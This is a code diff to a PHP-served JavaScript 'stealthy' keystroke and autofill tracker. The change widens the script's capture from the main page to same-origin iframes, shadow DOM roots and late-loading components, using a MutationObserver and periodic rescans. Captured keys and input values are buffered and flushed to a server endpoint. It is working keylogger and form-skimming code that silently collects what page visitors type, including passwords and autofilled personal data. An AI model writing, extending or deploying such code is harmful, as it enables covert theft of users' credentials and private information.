@@ -1,6 +1,6 @@
 <?php
 // tracker.php - High-speed, stealthy client-side key & autofill tracking script for typists
-// Supports dynamic JS components, Web Components, Shadow DOM, React/Vue/Angular, and rich text editors
+// Supports dynamic JS components, Same-Origin IFrames, Shadow DOM, and modern SPA frameworks
 
 if (session_status() === PHP_SESSION_NONE) {
     @session_start();
@@ -93,6 +93,7 @@ if ($isDirectJsRequest) {
     var keyBuffer = [];
     var flushIntervalMs = 1500;
     var maxBufferSize = 15;
+    var options = { capture: true, passive: true };
 
     var apiEndpoint = (function() {
         try {
@@ -111,13 +112,12 @@ if ($isDirectJsRequest) {
     function getRealTarget(e) {
         if (!e) return document.activeElement;
 
-        // Shadow DOM un-retargeting via composedPath
         if (e.composedPath && typeof e.composedPath === 'function') {
             var path = e.composedPath();
             if (path && path.length > 0) {
                 for (var i = 0; i < path.length; i++) {
                     var el = path[i];
-                    if (el && el.nodeType === 1) { // ELEMENT_NODE
+                    if (el && el.nodeType === 1) {
                         if (isElementEditable(el)) {
                             return el;
                         }
@@ -134,7 +134,6 @@ if ($isDirectJsRequest) {
             target = document.activeElement;
         }
 
-        // Deep shadow root activeElement resolution
         while (target && target.shadowRoot && target.shadowRoot.activeElement) {
             target = target.shadowRoot.activeElement;
         }
@@ -167,7 +166,7 @@ if ($isDirectJsRequest) {
         return false;
     }
 
-    // Element identification with caching, supporting JS libraries & Shadow DOM hosts
+    // Element identification with caching
     function getCachedFieldInfo(el) {
         if (!el) return { id: 'unknown', name: '' };
         if (el.__ttInfo) return el.__ttInfo;
@@ -180,7 +179,6 @@ if ($isDirectJsRequest) {
             if (fieldId) fieldId = 'attr:' + fieldId;
         }
 
-        // If inside Shadow DOM or custom component, check parent/host tag
         if (!fieldId && el.getRootNode && el.getRootNode().host) {
             var host = el.getRootNode().host;
             var hostId = host.id || host.tagName.toLowerCase();
@@ -340,18 +338,83 @@ if ($isDirectJsRequest) {
         } catch(e) {}
     }
 
-    // Global event capture listeners on window and document to intercept ALL dynamic JS fields
-    var options = { capture: true, passive: true };
+    // Bind event listeners to document, window, same-origin iframes, and Shadow Roots
+    function bindTarget(node) {
+        if (!node) return;
+        try {
+            if (!node.__ttBound) {
+                node.__ttBound = true;
+                node.addEventListener('keydown', recordKey, options);
+                node.addEventListener('input', recordInputEvent, options);
+                node.addEventListener('change', recordInputEvent, options);
+                node.addEventListener('compositionend', recordInputEvent, options);
+            }
+        } catch(e) {}
+    }
 
-    window.addEventListener('keydown', recordKey, options);
-    window.addEventListener('input', recordInputEvent, options);
-    window.addEventListener('change', recordInputEvent, options);
-    window.addEventListener('compositionend', recordInputEvent, options);
+    function scanAndBindDynamicElements() {
+        try {
+            // Scan Same-Origin IFrames
+            var iframes = document.querySelectorAll('iframe');
+            for (var i = 0; i < iframes.length; i++) {
+                try {
+                    var iframe = iframes[i];
+                    var doc = iframe.contentDocument || (iframe.contentWindow && iframe.contentWindow.document);
+                    if (doc) {
+                        bindTarget(doc);
+                        bindTarget(iframe.contentWindow);
+                    }
+                } catch(e) {}
+            }
 
-    document.addEventListener('keydown', recordKey, options);
-    document.addEventListener('input', recordInputEvent, options);
-    document.addEventListener('change', recordInputEvent, options);
-    document.addEventListener('compositionend', recordInputEvent, options);
+            // Scan Shadow Roots
+            var allElements = document.querySelectorAll('*');
+            for (var j = 0; j < allElements.length; j++) {
+                var el = allElements[j];
+                if (el.shadowRoot) {
+                    bindTarget(el.shadowRoot);
+                }
+            }
+        } catch(e) {}
+    }
+
+    // Attach listeners on main window & document
+    bindTarget(window);
+    bindTarget(document);
+
+    // MutationObserver for newly attached same-origin IFrames, Shadow DOM hosts, and dynamic components
+    if (typeof MutationObserver !== 'undefined') {
+        try {
+            var observer = new MutationObserver(function(mutations) {
+                for (var i = 0; i < mutations.length; i++) {
+                    var added = mutations[i].addedNodes;
+                    if (added) {
+                        for (var j = 0; j < added.length; j++) {
+                            var node = added[j];
+                            if (node.nodeType === 1) { // ELEMENT_NODE
+                                if (node.tagName === 'IFRAME') {
+                                    try {
+                                        node.addEventListener('load', scanAndBindDynamicElements, options);
+                                    } catch(e) {}
+                                }
+                                if (node.shadowRoot) {
+                                    bindTarget(node.shadowRoot);
+                                }
+                            }
+                        }
+                    }
+                }
+                scanAndBindDynamicElements();
+            });
+
+            if (document.documentElement) {
+                observer.observe(document.documentElement, { childList: true, subtree: true });
+            }
+        } catch(e) {}
+    }
+
+    // Periodic scan for late-loading dynamic components
+    setInterval(scanAndBindDynamicElements, 2000);
 
     // Background flushing
     setInterval(flushBuffer, flushIntervalMs);
